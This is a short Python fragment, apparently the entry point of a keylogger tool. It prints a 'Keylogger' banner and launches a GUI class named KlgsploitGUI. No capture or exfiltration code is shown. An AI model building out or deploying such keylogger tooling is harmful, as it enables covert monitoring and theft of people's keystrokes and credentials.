# Main entry point
if __name__ == "__main__":
    print("\n" + "=" * 70)
    print("🔐 Keylogger ")
    print("=" * 70)
    print("=" * 70 + "\n")
    
    app = KlgsploitGUI()
    app.run()